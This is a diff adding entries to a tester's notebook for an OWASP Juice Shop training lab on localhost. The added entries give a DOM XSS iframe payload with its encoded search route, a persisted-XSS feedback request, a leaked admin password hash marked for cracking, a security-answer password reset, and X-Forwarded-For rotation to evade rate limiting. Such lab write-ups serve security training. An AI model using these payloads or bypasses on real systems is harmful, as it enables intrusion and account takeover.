@@ -8,7 +8,7 @@ Purpose: Track reconnaissance, solved challenges, commands, evidence, and next a
 
 ## Current Status
 
-The application is reachable on port `3000` and has been confirmed as OWASP Juice Shop. Admin access was obtained through SQL injection login bypass. The hidden scoreboard was found, `/ftp` was enumerated, backup files were downloaded with a poison null byte bypass, and the encrypted token sale announcement was decrypted.
+The application is reachable on port `3000` and has been confirmed as OWASP Juice Shop. Admin access was obtained through SQL injection login bypass. The hidden scoreboard was found, `/ftp` was enumerated, backup files were downloaded with a poison null byte bypass, the encrypted token sale announcement was decrypted, DOM XSS was triggered, notification behavior was inspected, and several authentication/API clues were captured in Burp.
 
 Solved so far:
 
@@ -24,6 +24,9 @@ Solved so far:
 | Forgotten Developer Backup | Sensitive Data Exposure | Downloaded `package.json.bak` via the poison null byte bypass. |
 | Forgotten Sales Backup | Sensitive Data Exposure | Downloaded `coupons_2013.md.bak` via the poison null byte bypass. |
 | Blockchain Hype | Security through Obscurity | Decrypted `announcement_encrypted.md` and opened the hidden token sale route. |
+| DOM XSS | XSS | Injected the iframe JavaScript payload into the vulnerable frontend route and triggered the challenge notification. |
+| Mass Dispel | Miscellaneous | Restarted the server to recreate multiple challenge notifications, then used the notification convenience close-all behavior. |
+| Reset Morty's Password | Broken Anti Automation | Used Morty's obfuscated favorite pet answer instead of SQL injection. |
 
 ## Reconnaissance
 
@@ -374,6 +377,199 @@ CAPTCHA Bypass
 Zero Stars
 ```
 
+## JWT and Authorization Findings
+
+Burp captured authenticated requests containing both an `Authorization: Bearer` header and a `token` cookie. The decoded JWT payload exposed sensitive user fields for the admin account:
+
+```text
+email: admin@juice-sh.op
+role: admin
+password: 0192023a7bbd73250516f069df18b500
+```
+
+This is relevant to:
+
+```text
+Password Hash Leak
+Exposed credentials
+JWT-related challenges
+Authorization testing
+```
+
+Important request behavior:
+
+```text
+OWASP Juice Shop (Express ^4.22.1)
+401 UnauthorizedError: No Authorization header was found
+```
+
+That error confirms some REST/API endpoints require the bearer token header, not only browser cookies. When replaying authenticated requests in Burp Repeater, include:
+
+```http
+Authorization: Bearer <jwt>
+Cookie: token=<jwt>; language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss
+Content-Type: application/json
+```
+
+## XSS Notes
+
+The DOM XSS payload that solved the tutorial challenge was:
+
+```text
+<iframe src="javascript:alert(`xss`)">
+```
+
+URL-encoded form:
+
+```text
+%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
+```
+
+Correct route:
+
+```text
+http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
+```
+
+Incorrect route that only rendered text:
+
+```text
+http://localhost:3000/#/track-result/new?id=<payload>
+```
+
+Challenge notification observed after successful DOM XSS:
+
+```text
+You successfully solved a challenge: DOM XSS (Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">.)
+```
+
+Bonus payload for the SoundCloud challenge should also be tested through the vulnerable search route, fully URL-encoded:
+
+```html
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+```
+
+Feedback submission captured in Burp:
+
+```json
+{
+  "UserId": 1,
+  "captchaId": 4,
+  "captcha": "21",
+  "comment": "<iframe src=\"javascript:alert(`xss`)\">. (***in@juice-sh.op)",
+  "rating": 2
+}
+```
+
+This request is useful for API-only/persisted XSS testing, but it is a different path than the DOM XSS route.
+
+## Password Reset Notes
+
+Morty's password reset is not solved with SQL injection in the answer field. The challenge expects the obfuscated original answer to the security question.
+
+Failed attempt:
+
+```json
+{
+  "email": "morty@juice-sh.op",
+  "answer": "1=1--",
+  "new": "Admin1!!",
+  "repeat": "Admin1!!"
+}
+```
+
+Working answer:
+
+```text
+5N0wb41L
+```
+
+Working request body:
+
+```json
+{
+  "email": "morty@juice-sh.op",
+  "answer": "5N0wb41L",
+  "new": "Admin1!!",
+  "repeat": "Admin1!!"
+}
+```
+
+Endpoint:
+
+```http
+POST /rest/user/reset-password
+Host: localhost:3000
+Content-Type: application/json
+```
+
+If the endpoint blocks repeated attempts, rotate the test IP header in Burp:
+
+```http
+X-Forwarded-For: 127.0.0.123
+```
+
+## Notifications and Mass Dispel
+
+Challenge-solved notifications are client-side UI elements that appear when a challenge transitions from unsolved to solved. Replaying the same API request in Burp does not reliably recreate a solved notification once the challenge is already marked solved.
+
+Observed notification element:
+
+```html
+<mat-card class="mat-mdc-card mdc-card accent-notification ...">
+  <div class="notificationMessage">
+    <div class="contents">You successfully solved a challenge: DOM XSS ...</div>
+  </div>
+</mat-card>
+```
+
+The Mass Dispel challenge is easiest immediately after restarting the Juice Shop instance and accumulating several solved-challenge notifications. The convenience behavior is to hold `Shift` and click the close button on one notification to close multiple notifications at once.
+
+Server restart options:
+
+```bash
+docker ps
+docker restart <container_id>
+```
+
+Fresh Docker reset:
+
+```bash
+docker rm -f <container_id>
+docker run -d -p 3000:3000 bkimminich/juice-shop
+```
+
+Local npm restart:
+
+```bash
+Ctrl+C
+npm start
+```
+
+## Web3 Wallet Setup
+
+The Web3 challenges require a browser wallet such as MetaMask. Install the extension from:
+
+```text
+https://metamask.io/download/
+```
+
+Then refresh:
+
+```text
+http://localhost:3000
+```
+
+When Juice Shop prompts for wallet access, approve the MetaMask connection for the local lab.
+
+NFT clue captured from feedback:
+
+```text
+purpose betray marriage blame crunch monitor spin slide donate sport lift clutch
+```
+
+Use this only inside the local Juice Shop lab. It appears connected to `/juicy-nft` and the NFT/Web3 challenge path.
+
 ## File Upload Lead
 
 There are upload-related challenges:
@@ -418,7 +614,9 @@ Good next challenges to target:
 | Exposed Metrics | Easy observability endpoint discovery. |
 | Privacy Policy | Easy low-difficulty completion. |
 | Zero Stars | Input validation on feedback rating. |
-| DOM XSS | Tutorial challenge, useful for XSS path. |
+| Bonus Payload | Builds directly on the confirmed DOM XSS search route. |
+| API-only XSS | Feedback API payload submission path is already captured in Burp. |
+| NFT Takeover | Feedback API leaked a mnemonic phrase and `/juicy-nft` route clue. |
 
 ## Evidence Log
 
@@ -433,6 +631,11 @@ Good next challenges to target:
 | EVID-007 | 2026-05-04 | Token sale route | Python decrypt | RSA character lookup decryptor |
 | EVID-008 | 2026-05-04 | Challenge inventory | API | `curl http://localhost:3000/api/Challenges` |
 | EVID-009 | 2026-05-04 | Feedback API clues | API/Burp | Feedback JSON exposed NFT mnemonic and complaint upload hint |
+| EVID-010 | 2026-05-04 | DOM XSS | Browser | `/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E` |
+| EVID-011 | 2026-05-04 | JWT password hash exposure | Burp | Bearer JWT decoded to admin fields and hash |
+| EVID-012 | 2026-05-04 | Morty password reset answer | API/Burp | `POST /rest/user/reset-password` with answer `5N0wb41L` |
+| EVID-013 | 2026-05-04 | Notification behavior | Browser DevTools | DOM XSS solved notification inspected as Angular Material `mat-card` |
+| EVID-014 | 2026-05-04 | Web3 NFT clue | Feedback API | Seed phrase and `/juicy-nft` route found in feedback record |
 
 ## Rough Notes
 
@@ -442,5 +645,5 @@ Good next challenges to target:
 - The token sale route came from decrypted announcement content, not from brute forcing routes.
 - Feedback API response exposed a Web3 mnemonic clue and a complaint upload hint.
 - Upload functionality should be inspected with Burp before assuming it can lead to command execution.
-
-- Possible admin password to de-hash = "0192023a7bbd73250516f069df18b500",
+- Authenticated API replay may require the `Authorization: Bearer <jwt>` header even when the browser also has a token cookie.
+- Possible admin password hash to crack: `0192023a7bbd73250516f069df18b500`.
